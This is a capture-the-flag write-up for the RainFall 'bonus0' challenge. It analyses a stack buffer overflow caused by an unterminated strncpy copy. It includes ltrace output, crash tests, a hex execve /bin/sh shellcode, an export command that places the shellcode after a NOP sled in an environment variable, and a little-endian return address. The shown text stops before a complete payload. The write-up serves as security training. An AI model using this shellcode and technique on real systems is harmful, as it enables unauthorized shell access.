Let s analyse the source code : 

We have a bufer of 42 bytes : s[42]


ltrace ./bonus0
__libc_start_main(0x80485a4, 1, 0xbffff7f4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                                       = 4
read(0, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 4096)                              = 70
strchr("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., '\n')                               = "\n"
strncpy(0xbffff6d8, "aaaaaaaaaaaaaaaaaaaa", 20)                                   = 0xbffff6d8
puts(" - " - 
)                                                                       = 4
read(0, bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"..., 4096)                              = 73
strchr("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"..., '\n')                               = "\n"
strncpy(0xbffff6ec, "bbbbbbbbbbbbbbbbbbbb", 20)                                   = 0xbffff6ec
strcpy(0xbffff726, "aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"...)                         = 0xbffff726
strcat("aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"..., "bbbbbbbbbbbbbbbbbbbb\364\017\375\267") = "aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"...
puts("aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"...aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb??? bbbbbbbbbbbbbbbbbbbb???
)                                       = 70
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

After a few tests and analyzing the code, we can see that the buffer overflow is done on the strncpy function which copies 20 bytes into a 20 byte buffer in the pp function.
We notice that if we put  20 bytes or more in the first input, the second input will be copied in the buffer and the program will crash.

bonus0@RainFall:~$ ./bonus0
 - 
aaaaaaaaaaaaaaaaaaaa			--> 20 bytes
 - 
bbbbbbbbbbbbbbbbbbb				--> 19 bytes
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb bbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)

If we put 19 bytes in the first input and more than 19 bytes in the second input, the program will not crash, but we have some overflow :
bonus0@RainFall:~$ ./bonus0
 - 
aaaaaaaaaaaaaaaaaaa
 - 
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
aaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbb???


So if we can put a shell code in the second input, we maybe can execute it for example in a return address.

We don t want to have the second input to have more than 19 bytes because we don t want to have anything after copied into the first input (Because of the missing \0).
So we have 20 bytes for the first input + 19 bytes for the second input

We have a problem, we have to write a shellcode
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80		--> 24 bytes
but we only have 19 bytes for the second input (I explained that above)
So we have to store this shellcode somewhere in the memory and then jump to it.
We know that in the main arguments we have argc, argv and envp, and even if we have something like this :
main (void)
The env still exists in the memory, so we can store our shellcode, find the address of it and then jump to it.

export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

After we can find our env var with this command :
https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
https://shankaraman.wordpress.com/tag/finding-environment-variable-address-using-gdb/
(gdb) x/s *((char **)environ)

We have to do some other tests : 

bonus0@RainFall:~$ ./bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBCCCCDDDDEEEEDDD
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD
Segmentation fault (core dumped)

		20 bytes		19 bytes	1bytes		19 bytes		
<------------------><----------------->|<------------------>
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD

We have 20 + 19 + 1 +19 = 59 bytes

Now that we know that, we know we can overflow the s[42], to overwrite the return address.

0xbffff8b8 in little endian = \xb8\xf8\xff\xbf